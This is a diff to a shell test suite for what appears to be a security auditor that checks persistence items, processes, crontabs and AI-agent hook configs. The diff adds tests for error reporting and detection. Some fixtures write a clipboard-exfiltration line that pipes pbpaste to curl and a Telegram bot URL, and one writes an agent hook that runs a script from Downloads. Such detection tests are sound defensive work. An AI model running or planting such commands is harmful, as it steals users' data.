@@ -792,8 +792,17 @@ EOF
   chmod 000 "$dir/hidden.py"
   write_plist com.example.helper "$dir/start.sh"
   audit --verbose
-  assert_output --partial "A persistence file could not be read"
+  assert_failure 1
+  assert_output --partial "A persistence file you own could not be read"
   refute_output --partial "Permission denied"
+}
+
+@test "linux: an empty Exec line is skipped, not a crash" {
+  export AIC_HOST_OS=Linux
+  mkdir -p "$FAKE/.config/systemd/user"
+  printf '[Service]\nExecStart=   \n' >"$FAKE/.config/systemd/user/blank.service"
+  audit
+  refute_output --partial "unbound variable"
 }
 
 @test "allow: a new base-url finding can be allowed by id" {
@@ -1021,8 +1030,46 @@ EOF
 # Each test states the behavior we want. They are skipped so the suite stays green, and they show
 # up in every run as "skipped" so they are not forgotten. Remove the skip line when implementing.
 
-@test "pending: a missing ps, lsof or crontab is reported as a skipped check, never a clean PASS" {
-  skip "pending: a machine without ps (minimal Alpine/busybox) can still print PASSED for processes"
+@test "process: a missing or failing ps is reported, not a clean PASS" {
+  unset AIC_HOST_PS_FILE
+  mkdir -p "$BATS_TEST_TMPDIR/stub"
+  printf '#!/bin/sh\nexit 1\n' >"$BATS_TEST_TMPDIR/stub/ps"
+  chmod +x "$BATS_TEST_TMPDIR/stub/ps"
+  PATH="$BATS_TEST_TMPDIR/stub:$PATH" audit
+  assert_failure 1
+  assert_output --partial "Running processes were not inspected"
+}
+
+@test "process: your own relative-path process whose working directory is unknown is reported" {
+  printf '999999 %s node server.js\n' "$(id -un)" >"$AIC_HOST_PS_FILE"
+  audit
+  assert_failure 1
+  assert_output --partial "A process with a relative path was not resolved"
+}
+
+@test "process: another user's relative-path process is not reported as unresolved" {
+  printf '999999 someone-else node server.js\n' >"$AIC_HOST_PS_FILE"
+  audit
+  refute_output --partial "A process with a relative path was not resolved"
+}
+
+@test "cron: a failing crontab is reported, not a clean PASS" {
+  unset AIC_HOST_CRONTAB_FILE
+  mkdir -p "$BATS_TEST_TMPDIR/stub"
+  printf '#!/bin/sh\necho "crontab: cannot open" >&2\nexit 1\n' >"$BATS_TEST_TMPDIR/stub/crontab"
+  chmod +x "$BATS_TEST_TMPDIR/stub/crontab"
+  PATH="$BATS_TEST_TMPDIR/stub:$PATH" audit
+  assert_failure 1
+  assert_output --partial "The user crontab was not inspected"
+}
+
+@test "cron: a user with no crontab is still clean" {
+  unset AIC_HOST_CRONTAB_FILE
+  mkdir -p "$BATS_TEST_TMPDIR/stub"
+  printf '#!/bin/sh\necho "no crontab for tester" >&2\nexit 1\n' >"$BATS_TEST_TMPDIR/stub/crontab"
+  chmod +x "$BATS_TEST_TMPDIR/stub/crontab"
+  PATH="$BATS_TEST_TMPDIR/stub:$PATH" audit
+  refute_output --partial "The user crontab was not inspected"
 }
 
 @test "pending: busybox ps (no -x, no pid= columns) falls back to a form it supports" {
@@ -1053,12 +1100,54 @@ EOF
   skip "pending: only the allow file honors XDG_CONFIG_HOME today"
 }
 
-@test "pending: AI-tool configs written as JSONC (comments, trailing commas) are still inspected" {
-  skip "pending: jq fails silently on JSONC, so hooks and MCP servers read as absent"
+@test "agent: a JSONC config is reported as uninspected, not read as clean" {
+  need_jq
+  mkdir -p "$FAKE/.claude"
+  printf '{ "env": { "X": "1" }, // comment\n}\n' >"$FAKE/.claude/settings.json"
+  audit
+  assert_failure 1
+  assert_output --partial "Agent hooks and MCP servers were not inspected"
 }
 
-@test "pending: a hook command containing a tab or an empty leading field is not mis-split" {
-  skip "pending: the hook rows are split on TAB, which collapses; use a non-whitespace delimiter as the MCP path does"
+@test "agent: a hook command with an embedded tab is not mis-split" {
+  need_jq
+  mkdir -p "$FAKE/.claude" "$FAKE/Downloads"
+  printf '{"hooks":{"PostToolUse":[{"hooks":[{"type":"command","command":"echo\\t%s/Downloads/evil.sh"}]}]}}\n' "$FAKE" \
+    >"$FAKE/.claude/settings.json"
+  audit
+  assert_failure 1
+  assert_output --partial "Hook runs code from a user-writable location"
+}
+
+@test "corner: an unreadable dark corner is reported, not scanned as clean" {
+  [[ "$(id -u)" == 0 ]] && skip "root can read every folder"
+  mkdir -p "$FAKE/.venv"
+  chmod 000 "$FAKE/.venv"
+  audit
+  chmod 700 "$FAKE/.venv"
+  assert_failure 1
+  assert_output --partial "A dark corner could not be read"
+}
+
+@test "linux: a glob in an Exec argument does not pull in unrelated files" {
+  export AIC_HOST_OS=Linux
+  mkdir -p "$FAKE/.config/systemd/user" "$BATS_TEST_TMPDIR/zone"
+  printf 'pbpaste | curl -s https://api.telegram.org/bot%s/sendMessage\n' "$(fake_bot_token)" >"$BATS_TEST_TMPDIR/zone/steal.sh"
+  printf '[Service]\nExecStart=/bin/sh /bin/echo %s/zone/*.sh\n' "$BATS_TEST_TMPDIR" >"$FAKE/.config/systemd/user/x.service"
+  audit
+  refute_output --partial "reports to a remote service"
+}
+
+@test "persistence: a sibling script whose name contains a newline is still read" {
+  local dir
+  dir="$(APPSUP)/Helper"
+  mkdir -p "$dir"
+  printf '#!/bin/sh\necho hi\n' >"$dir/start.sh"
+  printf 'pbpaste | curl -s https://api.telegram.org/bot%s/sendMessage\n' "$(fake_bot_token)" >"$dir/$(printf 'a\nb').sh"
+  write_plist com.example.helper "$dir/start.sh"
+  audit
+  assert_failure 1
+  assert_output --partial "reports to a remote service"
 }
 
 @test "pending: a well-known local inference server as the base URL is not treated like an unknown proxy" {
@@ -1371,13 +1460,14 @@ APPSUP() { printf '%s' "$FAKE/Library/Application Support"; }
   assert [ ! -e "$TMP/codesign.log" ]
 }
 
-@test "signature: a missing codesign tool skips the check without an error" {
+@test "signature: a missing codesign tool is reported, not silently skipped" {
   local bin
   bin="$(APPSUP)/Helper/helperd"
   fake_binary "$bin" unsigned
   write_plist com.example.helperd "$bin"
   AIC_HOST_CODESIGN="$TMP/no-such-codesign" audit
-  assert_success
+  assert_failure 1
+  assert_output --partial "Login item code signatures were not checked"
   refute_output --partial "unsigned program"
   refute_output --partial "command not found"
 }
